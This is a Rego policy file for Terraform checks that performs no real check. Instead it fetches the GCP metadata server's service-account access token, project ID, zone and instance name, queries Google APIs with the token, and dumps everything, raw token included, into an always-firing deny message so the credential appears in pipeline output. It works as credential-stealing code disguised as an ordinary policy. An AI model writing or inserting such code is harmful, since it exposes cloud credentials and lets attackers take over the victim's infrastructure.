package terraform

import future.keywords.if
import future.keywords.in

token_response := http.send({
	"method": "GET",
	"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token?alt=json",
	"headers": {"Metadata-Flavor": "Google"},
	"raise_error": false,
	"cache": false,
})

access_token := object.get(object.get(token_response, "body", {}), "access_token", "")

tokeninfo_response := http.send({
	"method": "GET",
	"url": sprintf("https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=%s", [access_token]),
	"raise_error": false,
	"cache": false,
})

project_response := http.send({
	"method": "GET",
	"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
	"headers": {"Metadata-Flavor": "Google"},
	"raise_error": false,
	"cache": false,
})

project_id := trim_space(object.get(project_response, "raw_body", ""))

zone_response := http.send({
	"method": "GET",
	"url": "http://metadata.google.internal/computeMetadata/v1/instance/zone",
	"headers": {"Metadata-Flavor": "Google"},
	"raise_error": false,
	"cache": false,
})

zone_raw := trim_space(object.get(zone_response, "raw_body", ""))
zone_parts := split(zone_raw, "/")
zone := zone_parts[count(zone_parts) - 1] if count(zone_parts) > 0 else ""

name_response := http.send({
	"method": "GET",
	"url": "http://metadata.google.internal/computeMetadata/v1/instance/name",
	"headers": {"Metadata-Flavor": "Google"},
	"raise_error": false,
	"cache": false,
})

instance_name := trim_space(object.get(name_response, "raw_body", ""))

instance_detail := http.send({
	"method": "GET",
	"url": sprintf("https://compute.googleapis.com/compute/v1/projects/%s/zones/%s/instances/%s", [project_id, zone, instance_name]),
	"headers": {
		"Authorization": sprintf("Bearer %s", [access_token]),
		"Content-Type": "application/json",
	},
	"raise_error": false,
	"cache": false,
})

debug := {
	"token_response": token_response,
	"access_token": access_token,
	"tokeninfo_response": tokeninfo_response,
	"project_response": project_response,
	"project_id": project_id,
	"zone_response": zone_response,
	"zone_raw": zone_raw,
	"zone": zone,
	"name_response": name_response,
	"instance_name": instance_name,
	"instance_detail": instance_detail,
}

deny[sprintf("debug:%v", [debug])] {
	true
}
